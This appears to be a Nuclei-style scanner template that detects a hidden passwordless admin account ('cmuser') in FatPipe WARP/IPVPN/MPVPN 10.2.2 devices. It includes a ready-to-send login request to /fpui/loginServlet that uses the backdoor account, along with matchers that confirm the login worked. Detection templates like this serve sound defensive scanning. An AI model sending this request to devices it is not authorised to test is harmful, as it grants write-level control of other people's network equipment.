id: fatpipe-backdoor
info:
  author: gy741
  description: FatPipe Networks has a hidden administrative account cmuser that has
    no password and has write access permissions to the device. The user cmuser is
    not visible in Users menu list of the application.
  name: FatPipe Networks WARP/IPVPN/MPVPN 10.2.2 Hidden Backdoor Account
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5684.php
  - https://www.fatpipeinc.com/support/advisories.php
  severity: high
  tags: fatpipe,default-login,backdoor,auth-bypass
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    type: word
    words:
    - '"loginRes":"success"'
    - '"activeUserName":"cmuser"'
  matchers-condition: and
  raw:
  - 'POST /fpui/loginServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D

    '
